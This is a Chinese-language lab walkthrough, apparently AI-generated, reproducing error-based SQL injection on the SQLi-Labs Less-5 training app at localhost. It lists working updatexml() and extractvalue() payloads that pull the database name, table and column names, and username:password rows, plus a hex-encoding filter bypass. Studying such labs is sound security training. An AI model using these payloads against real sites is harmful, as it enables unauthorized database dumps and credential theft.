# SQLi-Labs Less-5 报错注入复现

我来帮你完整复现 **SQLi-Labs Less-5（报错注入）** 的漏洞利用过程，步骤清晰可直接执行👇

---

## 🔍 漏洞原理

Less-5 属于**单引号闭合的报错注入**，页面不会直接回显查询结果，但会输出SQL错误信息。我们利用 `updatexml()` 或 `extractvalue()` 函数的XPath语法错误，将敏感数据“挤”到报错信息中。

---

## 🛠️ 复现步骤

### 1. 判断注入点与闭合方式

先测试是否存在注入：

```Plain Text

http://127.0.0.1/sqli-labs/Less-5/?id=1'
```

如果返回SQL语法错误，说明存在注入，且闭合方式为**单引号**。

---

### 2. 获取当前数据库名

利用 `updatexml()` 触发XPath错误，带出数据库名：

```Plain Text

http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,database()),1)--+
```

- `0x7e` 是 `~` 的十六进制，用于触发XPath语法错误

- 报错信息中会显示 `~security`（当前数据库名）

---

### 3. 爆表名（获取所有表）

从 `information_schema.tables` 中查询当前数据库的所有表：

```Plain Text

http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+
```

报错信息中会显示 `~emails,referers,uagents,users`，其中 `users` 是目标表。

---

### 4. 爆字段名（获取users表的列）

查询 `users` 表的字段名：

```Plain Text

http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1)--+
```

报错信息中会显示 `~id,username,password`。

---

### 5. 脱库（获取用户名和密码）

由于 `updatexml()` 报错有长度限制，用 `limit` 逐行获取数据：

- 获取第一条数据：

```Plain Text

http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select concat(username,':',password) from users limit 0,1)),1)--+
```

报错信息中会显示 `~Dumb:Dumb`。

- 获取第二条数据：

```Plain Text

http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select concat(username,':',password) from users limit 1,1)),1)--+
```

以此类推，修改 `limit` 的偏移量（`limit 2,1`、`limit 3,1` 等）即可获取所有用户数据。

---

### 6. 替代方案：extractvalue函数

也可以用 `extractvalue()` 函数，原理完全相同：

```Plain Text

http://127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,database()))--+
```

同样会在报错信息中带出数据库名。

---

## ⚠️ 注意事项

1. **闭合方式**：Less-5 是单引号闭合，注入语句后必须用 `'` 闭合前面的引号，并用 `--+` 注释掉后面的内容。

2. **长度限制**：`updatexml()` 和 `extractvalue()` 的报错信息长度有限（约32位），超过会被截断，因此必须用 `limit` 逐行获取数据。

3. **编码绕过**：如果遇到字符集过滤，可将字符串转成十六进制，例如 `'users'` 转成 `0x7573657273`。


> （注：文档部分内容可能由 AI 生成）
